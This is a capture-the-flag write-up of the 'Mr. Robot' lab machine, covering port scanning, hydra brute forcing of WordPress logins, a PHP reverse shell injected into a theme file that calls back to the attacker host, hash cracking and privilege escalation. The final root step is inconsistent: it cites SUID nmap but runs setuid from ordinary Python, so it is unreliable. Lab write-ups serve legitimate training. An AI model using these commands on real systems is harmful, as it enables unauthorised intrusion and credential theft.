![Congrats](../assets/screenshots/mr%20robot/mr%20robot%20congrats.jpg)

# Mr. Robot CTF 

Step by Step Method to Get All 3 Flags:

## Step 1: Initial Reconnaissance
```bash
nmap -p- --min-rate 500 10.48.148.118
```

**Results:**
- Port 22: SSH (OpenSSH 8.2p1)
- Port 80: HTTP (Apache)
- Port 443: HTTPS (Apache)

```bash
nmap -p 22,80,443 -sC -sV -A 10.48.148.118
```

**Details:**
- Apache httpd running
- PHP/5.5.29
- SSL certificate: www.example.com (expired 2025)

## Step 2: Web Exploration & Flag 1
```bash
curl http://10.48.148.118/robots.txt
```
**Result:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

```bash
curl http://10.48.148.118/key-1-of-3.txt
```
**FIRST FLAG:** 
![First Flag](../assets/screenshots/mr%20robot/firstflag%20mrrobot.jpg)

```bash
curl -O http://10.48.148.118/fsocity.dic
```
Downloaded wordlist for brute forcing.

## Step 3: WordPress Username Enumeration
Found WordPress login at `http://10.48.148.118/wp-login.php`

```bash
hydra -L fsocity.dic -p test 10.48.148.118 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username" -t 64
```
**VALID USERNAME FOUND:** `Elliot`

## Step 4: WordPress Password Brute Force
```bash
sort fsocity.dic | uniq > fsocity_sorted.dic
wc -l fsocity_sorted.dic
```
**UNIQUE PASSWORDS:** 11,451

```bash
hydra -l Elliot -P fsocity_sorted.dic 10.48.148.118 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=302" -t 64
```
**PASSWORD FOUND:** `ER28-0652`
**WORDPRESS CREDENTIALS:** `Elliot:ER28-0652`

## Step 5: Reverse Shell Access
Logged into WordPress admin at `http://10.48.148.118/wp-admin`
Theme Editor Path: Appearance > Editor > 404 Template (404.php)

Replaced content with PHP reverse shell:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.48.107.77/9001 0>&1'");
?>
```

Listener on Attack Box (Terminal 1):
```bash
nc -lvnp 9001
```

Trigger the shell (Terminal 2):
```bash
curl http://10.48.148.118/anything
```

**SHELL OBTAINED:**
```
Connection received on 10.48.148.118 52792
daemon@ip-10-48-148-118:/opt/bitnami/apps/wordpress/htdocs$
```

Upgrade shell:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

## Step 6: Privilege Escalation to Robot User
```bash
ls -la /home/robot
```

**FILES:**
- `key-2-of-3.txt` (permission denied)
- `password.raw-md5` (readable)

```bash
cat /home/robot/password.raw-md5
```
**HASH:** `robot:c3fcd3d76192e4007dfb496cca67e13b`

On Attack Box - Crack the hash:
```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hash
hashcat -m 0 robot.hash /usr/share/wordlists/rockyou.txt --force
```
**CRACKED PASSWORD:** `abcdefghijklmnopqrstuvwxyz`

Switch to robot user:
```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

```bash
cat /home/robot/key-2-of-3.txt
```
**SECOND FLAG:** 
![Second Flag](../assets/screenshots/mr%20robot/secondflag%20mrrobot.jpg)

## Step 7: Privilege Escalation to Root
```bash
find / -perm -u=s -type f 2>/dev/null
```
**FOUND SUID BINARY:** `/usr/local/bin/nmap`

```bash
ls -la /usr/local/bin/nmap
-rwsr-xr-x 1 root root 17272 Jun 2 2025 /usr/local/bin/nmap
```

Exploited using Python (since nmap interactive had issues):
```bash
python3 -c 'import os; os.setuid(0); os.system("cat /root/key-3-of-3.txt")'
```

**THIRD FLAG:** 
![Third Flag](../assets/screenshots/mr%20robot/thirdflag%20mrrobot.jpg)

## Final Flags
- Flag 1: ![First Flag](../assets/screenshots/mr%20robot/firstflag%20mrrobot.jpg)
- Flag 2: ![Second Flag](../assets/screenshots/mr%20robot/secondflag%20mrrobot.jpg)
- Flag 3: ![Third Flag](../assets/screenshots/mr%20robot/thirdflag%20mrrobot.jpg)
